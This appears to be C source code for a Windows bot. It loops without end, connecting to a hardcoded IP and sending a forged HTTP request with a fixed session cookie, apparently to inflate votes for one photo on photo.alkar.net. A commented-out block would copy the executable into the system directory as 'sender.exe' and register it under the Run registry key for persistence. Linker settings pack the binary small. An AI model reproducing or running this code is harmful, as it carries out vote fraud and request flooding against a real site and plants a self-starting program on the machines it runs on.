#include <winsock2.h>
#include <ras.h>
#include <raserror.h>

#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:512 /SECTION:.text,EWRX /IGNORE:4078")
#pragma comment(linker,"/ENTRY:WinMain")

bool InternetConnected ();bool InternetConnected ()
{
	DWORD	nRasDevices = 20;
	DWORD	nSize = 20;
	RASCONN rasconnected [10];  

	rasconnected[0].dwSize = sizeof(RASCONN);
	RasEnumConnections( rasconnected, &nSize, &nRasDevices );

    return ( BOOL (nRasDevices) );
}

int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int)
{
	WSADATA			wsaData;
	SOCKET			sock;
	SOCKADDR_IN		addr;
	hostent*		hp; 
	HKEY			hRunKey = NULL;  
	char			path_exe[256];
	char			path_sys[256];
	bool			first=true;


char request[]=
		"GET /fotos.php?id=74278 HTTP/1.1\r\n"
		"Accept: */*\r\n"
		"Accept-Language: uk\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)\r\n"
		"Host: photo.alkar.net\r\n"
		"Connection: Keep-Alive\r\n"
		"Cookie: vote_user_id_10607=10607; PHPSESSID=bb14ce5f173af3382254efb70ab93511; topima=1; b=b\r\n"
		"\r\n";

/*
	GetModuleFileName(GetModuleHandle(0),path_exe,256);
	GetSystemDirectory(path_sys,256);

	if (strcmp(path_exe,path_sys))
	{
		strcat(path_sys,"\\sender.exe");
		CopyFile(path_exe,path_sys,true);

		RegCreateKeyEx( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 
						NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hRunKey, NULL );
		RegSetValueEx(hRunKey, "Sender", NULL,REG_SZ,(unsigned char *)path_sys,256);
		RegCloseKey(hRunKey);
	}

*/
	WSAStartup(MAKEWORD(2,2), &wsaData);

	while(true)
	{
	//	Sleep(20000);

		if(InternetConnected ())
		{
			sock = socket (AF_INET ,SOCK_STREAM,0);
			if(sock==INVALID_SOCKET) continue;

			if (first)
			{
				hp = gethostbyname("195.248.190.28");
				if (hp==NULL)  continue;

				memcpy(&(addr.sin_addr),hp->h_addr,hp->h_length);
				addr.sin_family=hp->h_addrtype;
				addr.sin_port= htons(80);

				first=false;
			}

			if (connect(sock,(struct sockaddr*)&addr, sizeof(addr))==SOCKET_ERROR) continue;

			send(sock,request,strlen(request),0);

			closesocket(sock);
		}
	}
}

